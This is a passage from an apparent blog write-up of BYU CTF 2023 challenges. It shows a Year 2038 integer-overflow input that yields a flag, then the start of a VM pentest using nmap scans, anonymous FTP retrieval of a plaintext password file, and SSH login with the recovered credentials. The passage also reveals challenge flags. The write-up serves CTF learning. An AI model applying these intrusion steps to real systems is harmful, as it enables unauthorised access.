&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Description: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;prints out the flag&amp;#39;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Date: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;undefined&amp;#39;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;ERROR&lt;&#x2F;span&gt;&lt;span&gt; - date for &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;print_flag&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt; task is not defined
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;This&lt;&#x2F;span&gt;&lt;span&gt; task is not available until January 1st, 2024
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;You&lt;&#x2F;span&gt;&lt;span&gt; may optionally extend this task to be available later
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;To&lt;&#x2F;span&gt;&lt;span&gt; specify when you would like to make the task available, specify the number of seconds since January 1st, 1970 UTC
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt; 
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;The callenge mock the &lt;a href=&quot;https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Year_2038_problem&quot; target=_blank&gt; Year 2038 problem &lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Signed 32-bit integers can only go up to January 19th, 2038. Any number larger than that will overflow, causing it to be a negative value, starting in 1901. The date January 1st, 2024 in seconds since January 1st, 1970 is 1704067200. If you put in a number less than that, it will tell you it&#x27;s too soon and exit early. If you put in a number larger than that, it will process it accordingly.&lt;&#x2F;p&gt;
&lt;p&gt;So, inputting extreme fo the signed integer gives us the flag.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mj0ln1r@AHLinux:&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;~&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;Desktop&#x2F;CYBER&#x2F;CTF&#x2F;Tools&#x2F;kcpassword$&lt;&#x2F;span&gt;&lt;span&gt; nc byuctf.xyz 40007
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Task: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;print_flag&amp;#39;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Description: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;prints out the flag&amp;#39;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Date: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;undefined&amp;#39;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;ERROR&lt;&#x2F;span&gt;&lt;span&gt; - date for &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;print_flag&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt; task is not defined
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;This&lt;&#x2F;span&gt;&lt;span&gt; task is not available until January 1st, 2024
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;You&lt;&#x2F;span&gt;&lt;span&gt; may optionally extend this task to be available later
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;To&lt;&#x2F;span&gt;&lt;span&gt; specify when you would like to make the task available, specify the number of seconds since January 1st, 1970 UTC
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2147483648
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Specified&lt;&#x2F;span&gt;&lt;span&gt; datetime - Fri Dec 13 20:45:52 1901
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Current&lt;&#x2F;span&gt;&lt;span&gt; datetime - Sat May 20 03:47:11 2023
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Time&lt;&#x2F;span&gt;&lt;span&gt; requirement has been met. Running &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;print_flag&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;...
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;byuctf{year_2038_problem_ftw&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag : byuctf{year_2038_problem_ftw}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;hr &#x2F;&gt;
&lt;h1 id=&quot;pentesting&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#pentesting&quot; aria-label=&quot;Anchor link for: pentesting&quot;&gt;Pentesting&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;h1 id=&quot;mi6configuration&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#mi6configuration&quot; aria-label=&quot;Anchor link for: mi6configuration&quot;&gt;MI6Configuration&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;Description :&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;text&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-text &quot;&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;&lt;span&gt;We recently acquired a computer at MI6 and it seems like they might have made some mistakes. Can you hack it using their misconfigurations and get all their important data? (Download the VM file and power it on. Find the IP address and start hacking!)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;*Note - there are 3 flags, flag2 does not exist*
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;https:&#x2F;&#x2F;byu.app.box.com&#x2F;s&#x2F;kqlgq3h7t43jqm7k0q124a1eivkonqln
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Lets do some pentesting here..&lt;&#x2F;p&gt;
&lt;p&gt;Imported the MI6.ova file in virtualbox and installed it successfully, then booted it up. The boot screen password was The first name of James Bond character Q. So, the password was &lt;code&gt;major&lt;&#x2F;code&gt; to complete the boot only this was not the actual login password for the machine.&lt;&#x2F;p&gt;
&lt;p&gt;The MI6 machine looks like this after booting.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;byu23&#x2F;byu23_mi6.png&quot; alt=&quot;mi6&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Did a quick nmap scan from my parrot machine on mi6 machine.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;‚îå‚îÄ[attacker@parrot]‚îÄ[&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;~&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;]
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;‚îî‚îÄ‚îÄ‚ïº &lt;&#x2F;span&gt;&lt;span&gt;$nmap&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; -Pn -sV&lt;&#x2F;span&gt;&lt;span&gt; 192.168.0.133
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Starting&lt;&#x2F;span&gt;&lt;span&gt; Nmap 7.93 ( https:&#x2F;&#x2F;nmap.org ) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;at&lt;&#x2F;span&gt;&lt;span&gt; 2023-05-24 18:31 IST
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Nmap&lt;&#x2F;span&gt;&lt;span&gt; scan report for 192.168.0.133
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Host&lt;&#x2F;span&gt;&lt;span&gt; is up (0.00098s latency)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;.
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Not&lt;&#x2F;span&gt;&lt;span&gt; shown: 729 filtered tcp ports (no-response)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt; 269 closed tcp ports (conn-refused)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;PORT&lt;&#x2F;span&gt;&lt;span&gt;   STATE SERVICE VERSION
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;21&#x2F;tcp&lt;&#x2F;span&gt;&lt;span&gt; open  ftp     vsftpd 3.0.3
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;22&#x2F;tcp&lt;&#x2F;span&gt;&lt;span&gt; open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;protocol&lt;&#x2F;span&gt;&lt;span&gt; 2.0)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Service&lt;&#x2F;span&gt;&lt;span&gt; Info: OSs: Unix, Linux&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;CPE:&lt;&#x2F;span&gt;&lt;span&gt; cpe:&#x2F;o:linux:linux_kernel
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Service&lt;&#x2F;span&gt;&lt;span&gt; detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Nmap&lt;&#x2F;span&gt;&lt;span&gt; done: 1 IP address (1 host up) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;scanned&lt;&#x2F;span&gt;&lt;span&gt; in 4.28 seconds
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Tried with default NSE script on the target.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;‚îå‚îÄ[attacker@parrot]‚îÄ[&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;~&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;]
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;‚îî‚îÄ‚îÄ‚ïº &lt;&#x2F;span&gt;&lt;span&gt;$nmap&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; -Pn -sC&lt;&#x2F;span&gt;&lt;span&gt; 192.168.0.133
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Starting&lt;&#x2F;span&gt;&lt;span&gt; Nmap 7.93 ( https:&#x2F;&#x2F;nmap.org ) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;at&lt;&#x2F;span&gt;&lt;span&gt; 2023-05-24 18:33 IST
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Nmap&lt;&#x2F;span&gt;&lt;span&gt; scan report for 192.168.0.133
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Host&lt;&#x2F;span&gt;&lt;span&gt; is up (0.00057s latency)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;.
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Not&lt;&#x2F;span&gt;&lt;span&gt; shown: 729 filtered tcp ports (no-response)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt; 269 closed tcp ports (conn-refused)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;PORT&lt;&#x2F;span&gt;&lt;span&gt;   STATE SERVICE
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;21&#x2F;tcp&lt;&#x2F;span&gt;&lt;span&gt; open  ftp
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;ftp-anon:&lt;&#x2F;span&gt;&lt;span&gt; Anonymous FTP login allowed (FTP code 230)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;-r--r--r--&lt;&#x2F;span&gt;&lt;span&gt;    1 33       0              22 Apr 17 22:01 flag1.txt
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;|&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;_-r--r--r--&lt;&#x2F;span&gt;&lt;span&gt;    1 1002     0              29 Apr 17 15:40 not_my_passwords.txt
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;ftp-syst: 
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;|   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;STAT: 
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;FTP&lt;&#x2F;span&gt;&lt;span&gt; server status:
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;|      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Connected&lt;&#x2F;span&gt;&lt;span&gt; to ::ffff:192.168.0.110
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;|      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Logged&lt;&#x2F;span&gt;&lt;span&gt; in as ftp
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;|      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;TYPE:&lt;&#x2F;span&gt;&lt;span&gt; ASCII
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;|      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;No&lt;&#x2F;span&gt;&lt;span&gt; session bandwidth limit
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;|      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Session&lt;&#x2F;span&gt;&lt;span&gt; timeout in seconds is 300
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;|      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Control&lt;&#x2F;span&gt;&lt;span&gt; connection is plain text
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;|      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Data&lt;&#x2F;span&gt;&lt;span&gt; connections will be plain text
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;|      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;At&lt;&#x2F;span&gt;&lt;span&gt; session startup, client count was 3
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;|      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;vsFTPd&lt;&#x2F;span&gt;&lt;span&gt; 3.0.3 - secure, fast, stable
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;|&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;_End&lt;&#x2F;span&gt;&lt;span&gt; of status
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;22&#x2F;tcp&lt;&#x2F;span&gt;&lt;span&gt; open  ssh
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;ssh-hostkey: 
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;|   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;2048&lt;&#x2F;span&gt;&lt;span&gt; c5849242153793582b2cc8f5d9eed24c (RSA)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;|   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;256&lt;&#x2F;span&gt;&lt;span&gt; bedc4b8fcfd3c50281bab7791f2b9afa (ECDSA)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;|&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;_&lt;&#x2F;span&gt;&lt;span&gt;  256 7b1fecd2c294bf1b1984f322005cde02 (ED25519)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Nmap&lt;&#x2F;span&gt;&lt;span&gt; done: 1 IP address (1 host up) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;scanned&lt;&#x2F;span&gt;&lt;span&gt; in 13.41 seconds
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Cool, there was an &lt;code&gt;anonymous&lt;&#x2F;code&gt; login available to the ftp service and two files were available to read.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;‚îå‚îÄ[attacket@parrot]‚îÄ[&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;~&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;]
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;‚îî‚îÄ‚îÄ‚ïº &lt;&#x2F;span&gt;&lt;span&gt;$ftp 192.168.0.133
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Connected&lt;&#x2F;span&gt;&lt;span&gt; to 192.168.0.133.
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;220&lt;&#x2F;span&gt;&lt;span&gt; (vsFTPd 3.0.3)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Name&lt;&#x2F;span&gt;&lt;span&gt; (192.168.0.133:attacker)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span&gt; anonymous
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;331&lt;&#x2F;span&gt;&lt;span&gt; Please specify the password.
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Password:
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;230&lt;&#x2F;span&gt;&lt;span&gt; Login successful.
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Remote&lt;&#x2F;span&gt;&lt;span&gt; system type is UNIX.
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Using&lt;&#x2F;span&gt;&lt;span&gt; binary mode to transfer files.
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;ftp&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt; ls
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;200&lt;&#x2F;span&gt;&lt;span&gt; PORT command successful. Consider using PASV.
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;150&lt;&#x2F;span&gt;&lt;span&gt; Here comes the directory listing.
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;-r--r--r--&lt;&#x2F;span&gt;&lt;span&gt;    1 33       0              22 Apr 17 22:01 flag1.txt
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;-r--r--r--&lt;&#x2F;span&gt;&lt;span&gt;    1 1002     0              29 Apr 17 15:40 not_my_passwords.txt
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;226&lt;&#x2F;span&gt;&lt;span&gt; Directory send OK.
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;ftp&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt; get flag1.txt
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;local&lt;&#x2F;span&gt;&lt;span&gt;: flag1.txt remote: flag1.txt
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;200&lt;&#x2F;span&gt;&lt;span&gt; PORT command successful. Consider using PASV.
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;150&lt;&#x2F;span&gt;&lt;span&gt; Opening BINARY mode data connection for flag1.txt (22 bytes)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;.
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;226&lt;&#x2F;span&gt;&lt;span&gt; Transfer complete.
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;22&lt;&#x2F;span&gt;&lt;span&gt; bytes received in 0.06 secs (0.3379 kB&#x2F;s)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;ftp&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt; get not_my_passwords.txt
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;local&lt;&#x2F;span&gt;&lt;span&gt;: not_my_passwords.txt remote: not_my_passwords.txt
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;200&lt;&#x2F;span&gt;&lt;span&gt; PORT command successful. Consider using PASV.
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;150&lt;&#x2F;span&gt;&lt;span&gt; Opening BINARY mode data connection for not_my_passwords.txt (29 bytes)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;.
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;226&lt;&#x2F;span&gt;&lt;span&gt; Transfer complete.
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;29&lt;&#x2F;span&gt;&lt;span&gt; bytes received in 0.02 secs (1.2592 kB&#x2F;s)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;ftp&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt; 
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;221&lt;&#x2F;span&gt;&lt;span&gt; Goodbye.
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;‚îå‚îÄ[attacker@parrot]‚îÄ[&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;~&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;]
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;‚îî‚îÄ‚îÄ‚ïº &lt;&#x2F;span&gt;&lt;span&gt;$cat flag1.txt 
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;byuctf{anonymous_ftp&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;‚îå‚îÄ[attacker@parrot]‚îÄ[&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;~&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;]
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;‚îî‚îÄ‚îÄ‚ïº &lt;&#x2F;span&gt;&lt;span&gt;$cat not_my_passwords.txt 
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;james_bond:imthebestAgent007
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag 1 : byuctf{anonymous_ftp}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;ul&gt;
&lt;li&gt;Using james_bond credentials tried to login on ssh.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;‚îå‚îÄ[attacker@parrot]‚îÄ[&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;~&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;]
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;‚îî‚îÄ‚îÄ‚ïº &lt;&#x2F;span&gt;&lt;span&gt;$ssh james_bond@192.168.0.133
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;The&lt;&#x2F;span&gt;&lt;span&gt; authenticity of host &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;192.168.0.133 (192.168.0.133)&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt; can&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;t be established.
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;Are you sure you want to continue connecting (yes&#x2F;no&#x2F;[fingerprint])? yes
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;Warning: Permanently added &amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;192.168.0.133&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39; (ECDSA) to the list of known hosts.
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;james_bond@192.168.0.133&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;s password: 
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Welcome&lt;&#x2F;span&gt;&lt;span&gt; to Ubuntu 18.04.6 LTS (GNU&#x2F;Linux 4.15.0-208-generic x86_64)
&lt;&#x2F;span&gt;&lt;span&gt;
